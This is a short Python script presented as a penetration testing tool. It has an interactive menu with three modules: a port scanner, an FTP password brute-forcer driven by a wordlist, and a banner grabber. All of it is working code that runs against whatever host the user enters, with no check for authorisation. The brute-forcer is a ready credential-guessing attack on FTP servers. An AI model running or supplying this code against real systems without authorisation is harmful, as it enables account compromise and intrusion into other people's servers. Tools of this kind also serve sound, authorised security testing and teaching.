import socket
import ftplib

# ---------------------- PORT SCANNER ----------------------
def scan_ports(host, ports=[21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306]):
    print(f"[+] Scanning ports on {host}...")
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))
                if result == 0:
                    print(f"[+] Port {port} is open")
                    open_ports.append(port)
        except Exception as e:
            print(f"[-] Error scanning port {port}: {e}")
    return open_ports

# ---------------------- FTP BRUTE FORCER ----------------------
def ftp_brute_force(host, username, password_list):
    print(f"[+] Starting FTP brute force on {host} with username '{username}'")
    for password in password_list:
        try:
            with ftplib.FTP(host) as ftp:
                ftp.login(user=username, passwd=password)
                print(f"[+] Success: {username}:{password}")
                return True
        except ftplib.error_perm:
            print(f"[-] Failed: {username}:{password}")
            continue
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
    print("[-] Brute force attack failed.")
    return False

# ---------------------- BANNER GRABBER ----------------------
def grab_banner(host, port):
    print(f"[+] Grabbing banner from {host}:{port}")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((host, port))
            banner = s.recv(1024).decode(errors='ignore').strip()
            print(f"[+] Banner: {banner}")
            return banner
    except Exception as e:
        print(f"[-] Error grabbing banner: {e}")
        return None

# ---------------------- MAIN MENU ----------------------
def main():
    print("""
    ===============================
      PENETRATION TESTING TOOl
    ===============================
    [1] Port Scanner
    [2] FTP Brute-Forcer
    [3] Banner Grabber
    """)

    target = input("Enter target IP or hostname: ")
    choice = input("Choose module: ")

    if choice == "1":
        scan_ports(target)

    elif choice == "2":
        username = input("Enter FTP username: ")
        passfile = input("Enter path to password list: ")
        try:
            with open(passfile, 'r') as f:
                passwords = f.read().splitlines()
            ftp_brute_force(target, username, passwords)
        except FileNotFoundError:
            print("[-] Password file not found.")

    elif choice == "3":
        port_input = input("Enter port number: ")
        if not port_input.isdigit():
            print("[-] Invalid port number.")
            return
        port = int(port_input)
        grab_banner(target, port)

    else:
        print("[-] Invalid choice")

if __name__ == "__main__":
    main()
